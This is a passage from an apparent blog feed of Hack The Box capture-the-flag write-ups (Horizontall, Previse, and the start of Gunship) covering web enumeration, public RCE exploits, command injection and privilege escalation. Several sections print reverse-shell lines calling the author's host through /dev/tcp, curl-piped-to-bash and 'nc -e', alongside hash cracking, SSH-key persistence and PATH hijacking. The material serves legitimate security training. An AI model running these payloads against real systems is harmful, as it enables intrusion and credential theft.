                        <span style="color:#f92672">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span style="color:#f92672">]</span>
:: Progress: <span style="color:#f92672">[</span>220547/220547<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">1422</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:02:57<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</code></pre></div><ul>
<li>No interesting directories/files found.</li>
<li>Going through the source code also did not yield anything interesting, so I had to dive deeper.</li>
</ul>
<h3 id="diving-deeper-into-source-code">Diving deeper into source code</h3>
<ul>
<li>The source code has link to various JS files. So taking a look at those, one file <code>http://horizontall.htb/js/app.c68eb462.js</code></li>
<li>Search through those files for <code>http://</code> links, hoping to find some interesting sub directory / sub domain, I found <code>api-prod</code> subdomain.</li>
</ul>
<p><img src="/img/horizontall/Pasted%20image%2020211230200846.png" alt=""></p>
<h3 id="fuzzing-for-directories-on-api-prod">Fuzzing for directories on <code>api-prod</code></h3>
<p>Before we fuzz, let&rsquo;s add IP <code>10.10.11.105</code> to <code>/etc/hosts</code> as <code>api-prod.horizontall.htb</code></p>
<p><em>/etc/hosts</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.11.105    horizontall.htb api-prod.horizontall.htb
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://api-prod.horizontall.htb/FUZZ -ic -c -w /usr/share/wordlists/dirb/common.txt -of html -o f_api_prod_common.html

        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\
</span><span style="color:#ae81ff"></span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://api-prod.horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Output file      : f_api_prod_common.html
 :: File format      : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : <span style="color:#ae81ff">10</span>
 :: Threads          : <span style="color:#ae81ff">40</span>
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        <span style="color:#f92672">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span style="color:#f92672">]</span>
admin                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
Admin                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
ADMIN                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
favicon.ico             <span style="color:#f92672">[</span>Status: 200, Size: 1150, Words: 4, Lines: 1<span style="color:#f92672">]</span>
index.html              <span style="color:#f92672">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span style="color:#f92672">]</span>
robots.txt              <span style="color:#f92672">[</span>Status: 200, Size: 121, Words: 19, Lines: 4<span style="color:#f92672">]</span>
reviews                 <span style="color:#f92672">[</span>Status: 200, Size: 507, Words: 21, Lines: 1<span style="color:#f92672">]</span>
users                   <span style="color:#f92672">[</span>Status: 403, Size: 60, Words: 1, Lines: 1<span style="color:#f92672">]</span>
:: Progress: <span style="color:#f92672">[</span>4614/4614<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">1055</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:04<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</code></pre></div><p><code>/admin</code> stands out. Visiting admin reveals that it is housing a login page for CMS called <code>strapi</code> at <a href="http://api-prod.horizontall.htb/admin/auth/login">http://api-prod.horizontall.htb/admin/auth/login</a>
<img src="/img/horizontall/Pasted%20image%2020220103200012.png" alt=""></p>
<h3 id="checking-for-vulnerabilities">Checking for vulnerabilities</h3>
<p>Visiting <code>/admin/init</code> we get version number. Version: <code>&quot;strapiVersion&quot;:&quot;3.0.0-beta.17.4&quot;</code></p>
<p><img src="/img/horizontall/Pasted%20image%2020220103200143.png" alt=""></p>
<p>This version is vulnerable to RCE. (Source: <a href="https://www.exploit-db.com/exploits/50239">https://www.exploit-db.com/exploits/50239</a>)</p>
<p>Downloading and running the exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 50239.py http://api-prod.horizontall.htb/
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103195637.png" alt=""></p>
<p>This exploit let&rsquo;s us run commands on system. Let&rsquo;s try to get a reverse shell.</p>
<h3 id="getting-a-reverse-shell">Getting a reverse shell</h3>
<p>We setup a netcat listener on port 443 (<code>sudo nc -nlvp 443</code>). Our normal payload does not work and does not yield a shell.</p>
<p>Payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.115/443 0&gt;&amp;1&#34;</span>
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103201451.png" alt=""></p>
<p>So pasting this command to a file <code>shell.sh</code> and running a Simple HTTP server in that directory using <code>sudo python3 -m http.server 80</code></p>
<p>Then we try to <code>curl</code> our shell.sh and pipe over to bash so that <code>bash</code> can execute our <code>shell.sh</code> and give us a reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl http://10.10.14.13/shell.sh | bash
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103202111.png" alt=""></p>
<p>and we get a reverse shell</p>
<p><img src="/img/horizontall/Pasted%20image%2020220103202213.png" alt=""></p>
<p>And then we can get the <code>user.txt</code> flag.</p>
<p><img src="/img/horizontall/Pasted%20image%2020220103202251.png" alt=""></p>
<h1 id="post-exploit-enumeration">Post Exploit Enumeration</h1>
<h4 id="active-ports">Active ports</h4>
<p><img src="/img/horizontall/Pasted%20image%2020211230205004.png" alt=""></p>
<h4 id="logging-in-ssh">Logging in SSH</h4>
<p>Inside <code>~</code> (/opt/strapi), we can make <code>.ssh</code> directory and add our public key, so that we can login using SSH instead of running the exploit again and again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~$ ls -la | grep .ssh
ls -la | grep .ssh
drwx------  <span style="color:#ae81ff">2</span> strapi strapi <span style="color:#ae81ff">4096</span> Jan  <span style="color:#ae81ff">3</span> 23:39 .ssh
</code></pre></div><p>Generate keys (can be on our local machine)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ ssh-keygen -f id_rsa
</code></pre></div><p>Then we have two files:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ ssh-keygen -f id_rsa
ssh-keygen -f id_rsa
Enter passphrase <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>:
Enter same passphrase again:
Generating public/private rsa key pair.
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:DAAaCnPxTt07FSQ7UePvcADqdlsJjJMRz05hCC75Rb0 strapi@horizontall
The key<span style="color:#ae81ff">\&#39;</span>s randomart image is:
+---<span style="color:#f92672">[</span>RSA 2048<span style="color:#f92672">]</span>----+
|+ +oo.++*o<span style="color:#f92672">=</span>      |
|o<span style="color:#f92672">=</span> + +.@.B o     |
|o o + O X.+      |
|   <span style="color:#f92672">=</span> o *E<span style="color:#f92672">=</span> +     |
|    o o S + o    |
|     . . + +     |
|        .   .    |
|                 |
|                 |
+----<span style="color:#f92672">[</span>SHA256<span style="color:#f92672">]</span>-----+
</code></pre></div><p>Copying the contents of <code>id_rsa.pub</code> to <code>authorized_keys</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ cat id_rsa.pub &gt;&gt; authorized_keys
cat id_rsa.pub &gt; authorized_keys

strapi@horizontall:~/.ssh$ ls -l
ls -l
total <span style="color:#ae81ff">12</span>
-rw-rw-r-- <span style="color:#ae81ff">1</span> strapi strapi  <span style="color:#ae81ff">400</span> Jan  <span style="color:#ae81ff">4</span> 19:17 authorized_keys
-rw------- <span style="color:#ae81ff">1</span> strapi strapi <span style="color:#ae81ff">1675</span> Jan  <span style="color:#ae81ff">4</span> 19:17 id_rsa
-rw-r--r-- <span style="color:#ae81ff">1</span> strapi strapi  <span style="color:#ae81ff">400</span> Jan  <span style="color:#ae81ff">4</span> 19:17 id_rsa.pub
</code></pre></div><p>Changing the permissions of the files:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ chmod <span style="color:#ae81ff">600</span> authorized_keys
chmod <span style="color:#ae81ff">600</span> authorized_keys
strapi@horizontall:~/.ssh$ chmod <span style="color:#ae81ff">600</span> id_rsa
chmod <span style="color:#ae81ff">600</span> id_rsa
strapi@horizontall:~/.ssh$ chmod <span style="color:#ae81ff">600</span> id_rsa.pub
chmod <span style="color:#ae81ff">600</span> id_rsa.pub
</code></pre></div><p>And then we <code>cat</code> the <code>id_rsa</code> file and copy it to our local machine. Then, we change the permission of that file as well.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod <span style="color:#ae81ff">600</span> id_rsa
</code></pre></div><h4 id="checking-for-open-ports">Checking for open ports</h4>
<p>We can check for ports open on the machine using this command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/$ ss -tulpn
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103203944.png" alt=""></p>
<p>There is port 8000 open (internally) and it hosts a website. Since we cannot access it externally, we will use SSH to forward our queries to this port</p>
<h4 id="local-port-forwarding-using-ssh">Local port forwarding using SSH</h4>
<p>The following commands forwards all the requests on our localhost and port 9000 to the remote host  -&gt; horizontall.htb:8000.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh -L 9000:localhost:8000 -i id_rsa strapi@horizontall.htb
</code></pre></div><p>Checking for open ports on our local machine and we can see that we have port 9000 open</p>
<p><img src="/img/horizontall/Pasted%20image%2020220103204750.png" alt=""></p>
<p>So when we visit http://localhost:9000, all the requests would be forwarded to <a href="http://horizontall.htb:8000/">http://horizontall.htb:8000/</a></p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<h4 id="remote-port-8000---enumeration">Remote Port 8000 - Enumeration</h4>
<p>The version that is running is: <code>Laravel v8 (PHP v7.4.18)</code></p>
<p><img src="/img/horizontall/Pasted%20image%2020220104145122.png" alt=""></p>
<h4 id="looking-for-exploits">Looking for exploits</h4>
<p>The version <code>Laravel v8 (PHP v7.4.18)</code> is vulnerable to RCE if it is running in debug more. More about RCE <a href="https://www.ambionics.io/blog/laravel-debug-rce">here</a></p>
<p>There is exploit available for this RCE at exploit-db.com -&gt; (<a href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a>)</p>
<h4 id="exploiting-laravel">Exploiting Laravel</h4>
<p><em>Before we start exploiting, let&rsquo;s see if this is actually vulnerable ie if this still runs in debug mode.</em></p>
<p>Sending a GET request to -&gt; <code>http://localhost:9000/_ignition/execute-solution</code> -&gt; reveals that debug mode is ON. That means this is exploitable.</p>
<p><img src="/img/horizontall/Pasted%20image%2020220104132325.png" alt=""></p>
<p>We gonna download the RCE from exploit-db. (<a href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a>) and run it.</p>
<p>We will be using the <code>shell.sh</code> file we created to get the user shell and use it to get the root shell as well. Setting up reverse shell on port 443 as <code>sudo nc -nlvp 443</code></p>
<p>Running the exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 49424.py http://localhost:9000 /home/developer/myproject/storage/logs/laravel.log <span style="color:#e6db74">&#39;curl http://10.10.14.49/shell.sh | bash&#39;</span>
</code></pre></div><p>And we get a shell on our listener. We are root. Yay!</p>
<p><img src="/img/horizontall/Pasted%20image%2020220104145749.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>HTB Previse - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-previse/</link>
            <pubDate>Sat, 08 Jan 2022 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-previse/</guid>
            <description>Enumeration Let&amp;rsquo;s kick off with some initial enumeration. We will run nmap scans to see what ports are open and what services are running on the open ports.
Initial Enumeration Nmap Scans Initial:
PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<p>Let&rsquo;s kick off with some initial enumeration. We will run nmap scans to see what ports are open and what services are running on the open ports.</p>
<h2 id="initial-enumeration">Initial Enumeration</h2>
<h4 id="nmap-scans">Nmap Scans</h4>
<p>Initial:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT      STATE    SERVICE    REASON
22/tcp    open     ssh        syn-ack
80/tcp    open     http       syn-ack
</code></pre></div><p>Service Scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<p>Now we know that port 80 is open, let&rsquo;s fuzz to find if there any hidden directories or files.</p>
<h4 id="ffuf">Ffuf</h4>
<p>common.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
accounts.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
download.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
favicon.ico             [Status: 200, Size: 15400, Words: 15, Lines: 10]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
files.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
logs.php                [Status: 200, Size: 2224, Words: 486, Lines: 54]
logout.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
status.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
</code></pre></div><p>medium.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -c -ic -of html -o http-medium.html
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
</code></pre></div><h4 id="sql-injections">SQL injections</h4>
<p><code>/login.php</code></p>
<ul>
<li>None of the sql injections worked.</li>
<li><code>sqlmap</code> also did not work</li>
<li>Request:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">POST /login.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://10.10.11.104/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=4natd10ok9pjvsrsuhr4ql0ktq
Connection: close
  
username=&#39;+OR+1=1;--&amp;password=&#39;+OR+1=1;--
</code></pre></div><pre><code>
</code></pre></li>
</ul>
<h1 id="initial-foothold">Initial Foothold</h1>
<h3 id="accountsphp">/accounts.php</h3>
<p>Request of <code>accounts.php</code> is redirected to -&gt; <code>login.php</code></p>
<p>But when intercepted with Burp, we have interesting results</p>
<p><img src="/img/previse/Pasted%20image%2020211225134915.png" alt=""></p>
<p>If we send a post request, we can create a new user
<img src="/img/previse/Pasted%20image%2020211225134951.png" alt=""></p>
<h4 id="sending-the-post-request">Sending the POST request</h4>
<p>Request:</p>
<p><img src="/img/previse/Pasted%20image%2020211225135604.png" alt=""></p>
<p>Response:
<img src="/img/previse/Pasted%20image%2020211225135625.png" alt=""></p>
<p>So now we have a user with username and password as <code>fakebatman:fakebatman</code></p>
<h2 id="getting-user-shell">Getting user shell</h2>
<p>The logs file executes a python script and appends a delimiter that is parsed through a POST parameter</p>
<p><em>logs.php</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
</span><span style="color:#75715e">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
</span><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
</span><span style="color:#75715e"></span>
$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">&#39;delim&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
<span style="color:#66d9ef">echo</span> $output;
</code></pre></div><p>So when we send the delim=<code>;ping 10.10.14.33 -c 5</code> and we run <code>tcpdump</code> to check if we are actually receiving any pings, we get ping hits.</p>
<p>Appending the command:</p>
<p><img src="/img/previse/Pasted%20image%2020211225175758.png" alt=""></p>
<p>And we get the ping hits:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo tcpdump -i tun0 icmp
</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225180213.png" alt=""></p>
<h3 id="getting-a-reverse-shell-www-data">Getting a reverse shell (www-data)</h3>
<p>Start a reverse shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -nlvp <span style="color:#ae81ff">4444</span>
</code></pre></div><p>Send the request</p>
<p><img src="/img/previse/Pasted%20image%2020211225180452.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">delim=;nc+10.10.14.33+4444+-e+/bin/sh
</span></code></pre></div><p>And we get a reverse shell</p>
<p><img src="/img/previse/Pasted%20image%2020211225180415.png" alt=""></p>
<h3 id="mysql-recon">MySQL recon</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u root -p
mysql&gt; SELECT * FROM accounts;
SELECT * FROM accounts;
+----+---------------+------------------------------------+---------------------+
| id | username      | password                           | created_at          |
+----+---------------+------------------------------------+---------------------+
|  <span style="color:#ae81ff">1</span> | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
</code></pre></div><p>Saving the hash into a file <code>m4lwhere.hash</code> and cracking the hash using hashcat</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">500</span> -a <span style="color:#ae81ff">0</span> m4lwhere.hash /usr/share/wordlists/rockyou.txt
</code></pre></div><p>The cracked password</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
</code></pre></div><h3 id="logging-in-using-these-creds">Logging in using these creds</h3>
<p>and hoping for a password reuse</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh m4lwhere@10.10.11.104
</code></pre></div><p>and <code>ilovecody112235!</code> as password we get a SSH shell</p>
<p><img src="/img/previse/Pasted%20image%2020211225183445.png" alt=""></p>
<h1 id="post-exploit-enumeration">Post Exploit Enumeration</h1>
<h3 id="sudo--l">sudo -l</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">m4lwhere@previse:~$ sudo -l
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> m4lwhere:
User m4lwhere may run the following commands on previse:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /opt/scripts/access_backup.sh
</code></pre></div><p><em>access_backup.sh</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># We always make sure to store logs, we take security SERIOUSLY here</span>

<span style="color:#75715e"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span style="color:#75715e"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>

gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_file_access.gz
</code></pre></div><p>Absolute paths for <code>gzip</code> and <code>date</code> is not mentioned.</p>
<h3 id="creating-a-new-file">Creating a new file</h3>
<p>Going to <code>/tmp</code> directory and creating a <code>date</code> file with contents</p>
<p><em>date</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 10.10.14.33 <span style="color:#ae81ff">9001</span> -e /bin/bash
</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225192245.png" alt=""></p>
<p>And then we add <code>tmp/</code> directory to the path</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export PATH<span style="color:#f92672">=</span>tmp:/$PATH
</code></pre></div><p>Now we run our script</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /opt/scripts/access_backup.sh
</code></pre></div><p>And we get a shell on our reverse tcp listener
<img src="/img/previse/Pasted%20image%2020211225192210.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>HTB Gunship - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-challenge-gunship/</link>
            <pubDate>Mon, 27 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-challenge-gunship/</guid>
            <description>Access details -&amp;gt; 159.65.31.1:32618
We are provided with a website which has only one input field and we have the source code available.
So let&amp;rsquo;s go through the source code which is made available to us.
Quick Recon  Packages installed (package.json)  &amp;#34;dependencies&amp;#34;: { &amp;#34;express&amp;#34;: &amp;#34;^4.17.1&amp;#34;, &amp;#34;flat&amp;#34;: &amp;#34;5.0.0&amp;#34;, &amp;#34;pug&amp;#34;: &amp;#34;^3.0.0&amp;#34; }  We have pug:3.0.0 which is vulnerable to RCE. Source: https://github.com/pugjs/pug/issues/3312    Location of vulnerability (routes/index.js)  const pug = require(&amp;#39;pug&amp;#39;); .</description>
            <content type="html"><![CDATA[<p>Access details -&gt; 159.65.31.1:32618</p>
<p>We are provided with a website which has only one input field and we have the source code available.</p>
<p>So let&rsquo;s go through the source code which is made available to us.</p>
<h3 id="quick-recon">Quick Recon</h3>
<ul>
<li>Packages installed (<code>package.json</code>)</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		<span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
			<span style="color:#f92672">&#34;express&#34;</span>: <span style="color:#e6db74">&#34;^4.17.1&#34;</span>,
			<span style="color:#f92672">&#34;flat&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
			<span style="color:#f92672">&#34;pug&#34;</span>: <span style="color:#e6db74">&#34;^3.0.0&#34;</span>
		}
</code></pre></div><ul>
<li>We have <code>pug:3.0.0</code> which is vulnerable to RCE.</li>
<li>Source: <a href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></li>
</ul>
